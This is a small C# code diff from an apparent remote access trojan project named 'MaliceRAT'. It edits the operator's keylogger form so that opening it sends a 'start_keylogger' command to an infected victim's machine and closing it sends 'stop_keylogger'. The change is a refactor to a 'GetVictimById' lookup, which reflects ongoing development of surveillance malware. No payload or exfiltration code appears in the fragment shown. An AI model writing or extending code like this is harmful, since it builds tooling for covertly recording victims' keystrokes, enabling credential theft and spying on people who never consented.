@@ -27,12 +27,12 @@ namespace MaliceRAT.RatUI
 
         private void KeyLoggerForm_Load(object sender, EventArgs e)
         {
-            server.SendJson(clientId, new { type = "start_keylogger" });
+            server.SendMessageTo(server.GetVictimById(clientId), new { type = "start_keylogger" });
         }
 
         private void KeyLoggerForm_FormClosing(object sender, FormClosingEventArgs e)
         {
-            server.SendJson(clientId, new { type = "stop_keylogger" });
+            server.SendMessageTo(server.GetVictimById(clientId), new { type = "stop_keylogger" });
         }
     }
 }
